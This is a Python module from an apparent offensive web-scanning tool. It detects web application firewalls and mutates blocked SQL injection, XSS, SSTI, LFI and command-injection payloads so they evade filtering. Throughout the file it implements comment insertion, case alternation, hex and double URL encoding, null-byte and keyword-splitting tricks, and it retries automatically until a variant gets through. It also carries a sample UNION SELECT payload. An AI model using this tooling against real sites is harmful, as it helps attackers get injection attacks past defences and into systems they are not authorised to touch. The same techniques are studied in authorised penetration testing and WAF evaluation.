"""
EnoughOfWeb — Payload Mutator & WAF Detector
Automatically mutates blocked payloads to bypass WAF/filter detection.

When a request returns 403, a known WAF signature, or input sanitization,
the mutator generates variants using encoding, obfuscation, and evasion
techniques — then retries automatically.

Mutation strategies (ordered by stealth):
  1. URL encoding (single + double)
  2. Case alternation (sElEcT)
  3. Comment insertion (SEL/**/ECT)
  4. Whitespace substitution (%09, %0a, +)
  5. Hex/Unicode encoding
  6. Keyword splitting with comments
  7. Null byte insertion
  8. Double URL encoding
  9. Mixed strategy (combine 2+ techniques)
"""

import re
import random
import urllib.parse
from typing import List, Optional, Dict, Set, Tuple


# ── WAF Detection ──────────────────────────────────────────────────────────

# Response codes that strongly suggest WAF
WAF_STATUS_CODES = {403, 406, 429, 503}

# Headers that indicate WAF presence
WAF_HEADERS = {
    "server": ["cloudflare", "akamaighost", "sucuri", "imperva", "barracuda",
               "f5 big-ip", "citrix", "fortiweb", "modsecurity"],
    "x-powered-by": ["asp.net", "waf"],
    "x-sucuri-id": None,  # Any value = WAF
    "x-cdn": None,
    "cf-ray": None,       # Cloudflare
    "x-waf-event-info": None,
    "x-firewall": None,
}

# Body patterns that indicate WAF blocking
WAF_BODY_PATTERNS = [
    r"blocked by.*(?:firewall|waf|security)",
    r"access denied",
    r"request blocked",
    r"web application firewall",
    r"mod_security",
    r"not acceptable.*406",
    r"your request has been blocked",
    r"security policy violation",
    r"suspicious activity",
    r"automated request",
    r"please verify you are human",
    r"captcha",
    r"rate.?limit",
    r"too many requests",
    r"illegal.?request",
    r"attack detected",
    r"malicious.*(?:request|input|payload)",
]

# Keywords that WAFs commonly filter
SQL_KEYWORDS = {"SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "DROP",
                "FROM", "WHERE", "AND", "OR", "ORDER", "GROUP", "HAVING",
                "LIMIT", "OFFSET", "JOIN", "TABLE", "DATABASE", "SCHEMA",
                "INFORMATION_SCHEMA", "SLEEP", "BENCHMARK", "EXTRACTVALUE",
                "UPDATEXML", "CONCAT", "GROUP_CONCAT", "SUBSTR", "SUBSTRING",
                "ASCII", "CHAR", "HEX", "UNHEX", "LOAD_FILE", "INTO",
                "OUTFILE", "NULL"}

XSS_KEYWORDS = {"SCRIPT", "ALERT", "ONERROR", "ONLOAD", "ONCLICK",
                "JAVASCRIPT", "EVAL", "DOCUMENT", "COOKIE", "IMG",
                "SVG", "BODY", "IFRAME", "SRC", "HREF"}

TEMPLATE_KEYWORDS = {"CONFIG", "CLASS", "INIT", "GLOBALS", "POPEN",
                     "IMPORT", "OS", "SUBPROCESS", "BUILTINS"}


class WAFDetector:
    """Detects WAF presence from HTTP responses."""

    def __init__(self):
        self._compiled_patterns = [
            re.compile(p, re.IGNORECASE) for p in WAF_BODY_PATTERNS
        ]
        self._waf_detected_urls: Set[str] = set()

    def is_waf_response(self, response) -> Tuple[bool, str]:
        """
        Check if a response indicates WAF blocking.

        Returns:
            (is_blocked, reason)
        """
        if response is None:
            return False, ""

        # Status code check
        if response.status_code in WAF_STATUS_CODES:
            # 403 on its own is suspicious but check body too
            if response.status_code == 403:
                reason = f"HTTP 403"
                # Check if it's a WAF 403 vs normal 403
                for pattern in self._compiled_patterns:
                    if pattern.search(response.text):
                        return True, f"{reason} + body match: {pattern.pattern[:40]}"
                # 403 with very short body is likely WAF
                if len(response.text) < 500:
                    return True, f"{reason} (short response, likely WAF)"
            else:
                return True, f"HTTP {response.status_code}"

        # Header check
        for header, waf_values in WAF_HEADERS.items():
            header_val = response.headers.get(header, "").lower()
            if not header_val:
                continue
            if waf_values is None:
                # Any value means WAF
                return True, f"WAF header: {header}={header_val}"
            for waf_val in waf_values:
                if waf_val in header_val:
                    return True, f"WAF header: {header} contains '{waf_val}'"

        # Body pattern check (only if not already caught by status)
        if response.status_code == 200:
            for pattern in self._compiled_patterns:
                if pattern.search(response.text):
                    return True, f"Body match: {pattern.pattern[:40]}"

        return False, ""

    def mark_url(self, url: str):
        """Mark a URL as having WAF protection."""
        self._waf_detected_urls.add(url)

    def has_waf(self, url: str) -> bool:
        """Check if we've previously detected WAF on this URL."""
        return url in self._waf_detected_urls


class PayloadMutator:
    """
    Generates mutated payload variants to bypass WAF/input filters.

    Usage:
        mutator = PayloadMutator()
        variants = mutator.mutate("' UNION SELECT NULL--", max_variants=5)
        for variant in variants:
            response = send(variant)
            if not waf_detector.is_waf_response(response):
                break  # This variant bypassed the WAF
    """

    # Maximum mutations per payload to prevent explosion
    MAX_VARIANTS = 10

    def __init__(self):
        self._successful_strategies: Dict[str, List[str]] = {}
        self._failed_strategies: Dict[str, Set[str]] = {}

    def mutate(
        self,
        payload: str,
        max_variants: int = 5,
        context: str = "sql",
        target_url: str = "",
    ) -> List[str]:
        """
        Generate mutated variants of a payload.

        Args:
            payload: Original payload string
            max_variants: Max number of variants to generate
            context: "sql", "xss", "ssti", "lfi", "cmdi" — affects mutation strategy
            target_url: URL for tracking successful strategies

        Returns:
            List of mutated payload strings (does NOT include original)
        """
        variants = []
        seen = {payload}  # Don't return duplicates or original
        max_variants = min(max_variants, self.MAX_VARIANTS)

        # Prioritize strategies that worked before for this URL
        strategies = self._get_ordered_strategies(context, target_url)

        for strategy_fn in strategies:
            if len(variants) >= max_variants:
                break

            try:
                result = strategy_fn(payload, context)
                if isinstance(result, list):
                    for r in result:
                        if r not in seen and len(variants) < max_variants:
                            variants.append(r)
                            seen.add(r)
                elif result and result not in seen:
                    variants.append(result)
                    seen.add(result)
            except Exception:
                continue

        return variants

    def record_success(self, target_url: str, strategy_name: str):
        """Record that a mutation strategy worked for a URL."""
        if target_url not in self._successful_strategies:
            self._successful_strategies[target_url] = []
        if strategy_name not in self._successful_strategies[target_url]:
            self._successful_strategies[target_url].append(strategy_name)

    def record_failure(self, target_url: str, strategy_name: str):
        """Record that a mutation strategy failed for a URL."""
        if target_url not in self._failed_strategies:
            self._failed_strategies[target_url] = set()
        self._failed_strategies[target_url].add(strategy_name)

    # ── Strategy Ordering ──────────────────────────────────────────────────

    def _get_ordered_strategies(self, context: str, target_url: str) -> list:
        """Order strategies: successful ones first, then by context."""
        all_strategies = {
            "url_encode":         self._url_encode,
            "double_url_encode":  self._double_url_encode,
            "case_alternate":     self._case_alternate,
            "comment_insert":     self._comment_insert,
            "whitespace_sub":     self._whitespace_sub,
            "hex_encode":         self._hex_encode,
            "null_byte":          self._null_byte,
            "keyword_split":      self._keyword_split,
            "mixed_combo":        self._mixed_combo,
        }

        # Context-specific ordering
        if context == "sql":
            priority = ["comment_insert", "case_alternate", "whitespace_sub",
                         "url_encode", "hex_encode", "keyword_split",
                         "double_url_encode", "null_byte", "mixed_combo"]
        elif context == "xss":
            priority = ["url_encode", "case_alternate", "hex_encode",
                         "double_url_encode", "null_byte", "whitespace_sub",
                         "mixed_combo"]
        elif context == "ssti":
            priority = ["url_encode", "hex_encode", "whitespace_sub",
                         "double_url_encode", "unicode_normalize",
                         "mixed_combo"]
        elif context == "lfi":
            priority = ["double_url_encode", "url_encode", "null_byte",
                         "whitespace_sub", "mixed_combo"]
        elif context == "cmdi":
            priority = ["whitespace_sub", "hex_encode", "url_encode",
                         "null_byte", "mixed_combo"]
        else:
            priority = list(all_strategies.keys())

        # Move previously successful strategies to front
        if target_url in self._successful_strategies:
            for s in reversed(self._successful_strategies[target_url]):
                if s in priority:
                    priority.remove(s)
                    priority.insert(0, s)

        # Remove previously failed strategies (push to end)
        failed = self._failed_strategies.get(target_url, set())

        ordered = []
        for name in priority:
            if name in all_strategies and name not in failed:
                ordered.append(all_strategies[name])

        # Add failed ones at the end (last resort)
        for name in priority:
            if name in all_strategies and name in failed:
                ordered.append(all_strategies[name])

        return ordered

    # ── Mutation Strategies ────────────────────────────────────────────────

    def _url_encode(self, payload: str, context: str) -> List[str]:
        """URL-encode special characters."""
        # Encode only special chars
        result1 = ""
        for ch in payload:
            if ch in "'\"<>{}()&|;#/\\":
                result1 += urllib.parse.quote(ch, safe="")
            else:
                result1 += ch

        # Full encode everything except alphanumeric
        result2 = urllib.parse.quote(payload, safe="")

        return [result1, result2]

    def _double_url_encode(self, payload: str, context: str) -> str:
        """Double URL-encode: %27 → %2527."""
        single = urllib.parse.quote(payload, safe="")
        return urllib.parse.quote(single, safe="")

    def _case_alternate(self, payload: str, context: str) -> List[str]:
        """Alternating case: SELECT → sElEcT."""
        keywords = SQL_KEYWORDS if context == "sql" else XSS_KEYWORDS

        # Strategy 1: random alternation
        result1 = list(payload)
        for i, ch in enumerate(result1):
            if ch.isalpha():
                result1[i] = ch.upper() if i % 2 == 0 else ch.lower()
        variant1 = "".join(result1)

        # Strategy 2: keyword-specific alternation
        variant2 = payload
        for kw in keywords:
            # Find keyword in payload (case insensitive)
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            matches = pattern.finditer(variant2)
            for match in matches:
                original = match.group()
                alternated = "".join(
                    ch.upper() if i % 2 == 0 else ch.lower()
                    for i, ch in enumerate(original)
                )
                variant2 = variant2[:match.start()] + alternated + variant2[match.end():]
                break  # Only first occurrence

        return [variant1, variant2]

    def _comment_insert(self, payload: str, context: str) -> List[str]:
        """Insert /**/ comments between SQL keywords: UN/**/ION."""
        if context not in ("sql",):
            return []

        keywords = SQL_KEYWORDS
        variants = []

        # Strategy 1: Split all keywords with /**/
        result = payload
        for kw in sorted(keywords, key=len, reverse=True):
            pattern = re.compile(r'\b' + re.escape(kw) + r'\b', re.IGNORECASE)
            if pattern.search(result):
                mid = len(kw) // 2
                replacement = kw[:mid] + "/**/" + kw[mid:]
                result = pattern.sub(replacement, result, count=1)
        if result != payload:
            variants.append(result)

        # Strategy 2: Add /**/ as whitespace
        result2 = re.sub(r'\s+', '/**/', payload)
        if result2 != payload:
            variants.append(result2)

        # Strategy 3: /*!UNION*/ MySQL inline comment syntax
        result3 = payload
        for kw in sorted(keywords, key=len, reverse=True):
            pattern = re.compile(r'\b' + re.escape(kw) + r'\b', re.IGNORECASE)
            if pattern.search(result3):
                result3 = pattern.sub(f"/*!{kw}*/", result3, count=1)
        if result3 != payload:
            variants.append(result3)

        return variants

    def _whitespace_sub(self, payload: str, context: str) -> List[str]:
        """Replace spaces with alternative whitespace characters."""
        variants = []

        # Tab
        variants.append(payload.replace(" ", "\t"))
        # URL-encoded tab
        variants.append(payload.replace(" ", "%09"))
        # URL-encoded newline
        variants.append(payload.replace(" ", "%0a"))
        # Plus sign
        variants.append(payload.replace(" ", "+"))
        # Multiple spaces
        variants.append(re.sub(r' ', '  ', payload))

        return [v for v in variants if v != payload]

    def _hex_encode(self, payload: str, context: str) -> List[str]:
        """Hex-encode string literals and special chars."""
        variants = []

        if context == "sql":
            # Replace string literals with hex: 'admin' → 0x61646D696E
            def str_to_hex(match):
                s = match.group(1)
                hex_str = "0x" + s.encode().hex()
                return hex_str

            result = re.sub(r"'([^']+)'", str_to_hex, payload)
            if result != payload:
                variants.append(result)

            # CHAR() encoding: 'A' → CHAR(65)
            def str_to_char(match):
                s = match.group(1)
                chars = ",".join(str(ord(c)) for c in s)
                return f"CHAR({chars})"

            result2 = re.sub(r"'([^']+)'", str_to_char, payload)
            if result2 != payload:
                variants.append(result2)

        elif context == "xss":
            # HTML entity encode
            result = ""
            for ch in payload:
                if ch in "<>\"'&/":
                    result += f"&#x{ord(ch):x};"
                else:
                    result += ch
            variants.append(result)

        return variants

    def _null_byte(self, payload: str, context: str) -> List[str]:
        """Insert null bytes to confuse parsers."""
        variants = []

        # %00 before comment terminators
        variants.append(payload.replace("--", "%00--"))
        variants.append(payload.replace("#", "%00#"))

        # %00 at end
        variants.append(payload + "%00")

        # Null byte in extension (LFI)
        if context == "lfi":
            variants.append(payload + "%00.php")
            variants.append(payload + "%00.html")

        return [v for v in variants if v != payload]

    def _keyword_split(self, payload: str, context: str) -> List[str]:
        """Split keywords with various techniques."""
        if context != "sql":
            return []

        variants = []
        keywords = SQL_KEYWORDS

        # Concat splitting: UNION → UN'+'ION (SQL Server)
        result = payload
        for kw in sorted(keywords, key=len, reverse=True):
            pattern = re.compile(r'\b' + re.escape(kw) + r'\b', re.IGNORECASE)
            if pattern.search(result):
                mid = len(kw) // 2
                replacement = kw[:mid] + "'" + "+" + "'" + kw[mid:]
                result = pattern.sub(replacement, result, count=1)
        if result != payload:
            variants.append(result)

        return variants

    def _mixed_combo(self, payload: str, context: str) -> List[str]:
        """Combine multiple strategies for maximum evasion."""
        variants = []

        # Case alternate + comment insert
        case_results = self._case_alternate(payload, context)
        for cr in case_results[:1]:
            comment_results = self._comment_insert(cr, context)
            variants.extend(comment_results[:1])

        # URL encode + whitespace sub
        url_results = self._url_encode(payload, context)
        for ur in url_results[:1]:
            ws_results = self._whitespace_sub(ur, context)
            variants.extend(ws_results[:1])

        # Case alternate + whitespace sub
        for cr in case_results[:1]:
            ws_results = self._whitespace_sub(cr, context)
            variants.extend(ws_results[:1])

        return variants


# ── Convenience Functions ──────────────────────────────────────────────────

def detect_and_mutate(
    response,
    original_payload: str,
    context: str = "sql",
    target_url: str = "",
    waf_detector: Optional[WAFDetector] = None,
    mutator: Optional[PayloadMutator] = None,
    max_variants: int = 5,
) -> Tuple[bool, str, List[str]]:
    """
    Check if a response indicates WAF blocking. If so, generate mutations.

    Args:
        response: requests.Response object
        original_payload: The payload that was blocked
        context: Payload context (sql, xss, ssti, lfi, cmdi)
        target_url: Target URL
        waf_detector: WAFDetector instance (created if None)
        mutator: PayloadMutator instance (created if None)
        max_variants: How many variants to generate

    Returns:
        (is_blocked, reason, mutated_payloads)
    """
    if waf_detector is None:
        waf_detector = WAFDetector()
    if mutator is None:
        mutator = PayloadMutator()

    is_blocked, reason = waf_detector.is_waf_response(response)

    if is_blocked:
        waf_detector.mark_url(target_url)
        variants = mutator.mutate(
            original_payload,
            max_variants=max_variants,
            context=context,
            target_url=target_url,
        )
        return True, reason, variants

    return False, "", []
